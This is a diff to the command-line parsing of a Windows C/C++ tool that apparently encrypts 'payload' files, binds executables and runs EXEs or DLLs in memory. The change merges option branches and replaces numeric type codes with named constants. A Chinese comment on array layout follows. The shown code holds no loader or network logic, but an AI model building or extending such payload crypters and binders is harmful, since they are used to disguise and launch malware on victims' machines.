@@ -16,6 +16,7 @@
 #include "crypto.h"
 #include "test.h"
 #include "PEParser.h"
+#include "Resource.h"
 
 #define CONFIG_FILENAME					"config.dat"
 
@@ -32,7 +33,6 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 #endif
 
 	int ret = 0;
-
 
 	if (argc < 3)
 	{
@@ -53,10 +53,8 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		return -1;
 	}
 
-
 	string curpath = Public::getCurPath();
 	ret = SetCurrentDirectoryA(curpath.c_str());
-
 
 	char filelist[MAX_FILE_COUNT][256];
 	memset(filelist, 0, MAX_FILE_COUNT * 256);
@@ -72,11 +70,11 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 
 	for (int i = 1; i < argc; )
 	{
-		if (lstrcmpiA(argv[i], "-be") == 0)
+		if (lstrcmpiA(argv[i], "-be") == 0 || lstrcmpiA(argv[i], "-bd") == 0)
 		{
 			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 
-			type = 3;
+			type = BIND_RELEASE_EXE;
 			for (int j = i + 1, k = 0; k < 2; j++, k++)
 			{
 				lstrcpyA(filelist[k], argv[j]);
@@ -85,45 +83,36 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 			i += 3;
 			continue;
 		}
-		else if (lstrcmpiA(argv[i], "-bd") == 0)
+		else if (lstrcmpiA(argv[i], "-boe") == 0 || lstrcmpiA(argv[i], "-bod") == 0)
 		{
 			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
-			type = 4;
-			for (int j = i + 1, k = 0; k < 2; j++, k++)
+
+			type = BIND_RELEASE_EXE;
+			for (int j = i + 1, k = 0; k < 1; j++, k++)
 			{
 				lstrcpyA(filelist[k], argv[j]);
 				paramscnt++;
 			}
+			i += 2;
+			continue;
+		}
+		else if (lstrcmpiA(argv[i], "-dh") == 0 || lstrcmpiA(argv[i], "-eh") == 0)
+		{
+			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
+			type = BIND_RELEASE_EXE;
+			Crypto::cryptPayloadFile(argv[i + 1], TEMPLATE_TEMPORARY_FILENAME);
+			lstrcpyA(filelist[paramscnt], TEMPLATE_TEMPORARY_FILENAME);
+			paramscnt++;
+			i += 2;
+			continue;
+		}
 
-			i += 3;
-			continue;
-		}
-		else if (lstrcmpiA(argv[i], "-dh") == 0)
-		{
-			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
-			type = 4;
-			Crypto::cryptPayloadFile(argv[i + 1], TEMPLATE_TEMPORARY_FILENAME);
-			lstrcpyA(filelist[paramscnt], TEMPLATE_TEMPORARY_FILENAME);
-			paramscnt++;
-			i += 2;
-			continue;
-		}
-		else if (lstrcmpiA(argv[i], "-eh") == 0)
-		{
-			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
-			type = 3;
-			Crypto::cryptPayloadFile(argv[i + 1], TEMPLATE_TEMPORARY_FILENAME);
-			lstrcpyA(filelist[paramscnt], TEMPLATE_TEMPORARY_FILENAME);
-			paramscnt++;
-			i += 2;
-			continue;
-		}
 		else if (lstrcmpiA(argv[i], "-e") == 0)
 		{
 			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 			printf("argv[%i]:%s\r\n", i, argv[i + 1]);
 
-			type = 1;
+			type = MEM_RUN_EXE;
 			lstrcpyA(filelist[0], argv[i + 1]);
 			paramscnt++;
 			i += 2;
@@ -132,7 +121,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		else if (lstrcmpiA(argv[i], "-d") == 0)
 		{
 			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
-			type = 2;
+			type = MEM_RUN_DLL;
 			lstrcpyA(filelist[0], argv[i + 1]);
 			paramscnt++;
 			i += 2;
@@ -213,7 +202,7 @@ int __stdcall wWinMain(HINSTANCE inst, HINSTANCE prev, PWSTR cmdline, int showmo
 #endif
 
 
-#include "Resource.h"
+
 
 //array[x][y]在内存中是随着内存地址递增的,array[x] array[x+1] 差是16，why?
 //*[]结构是指针数组
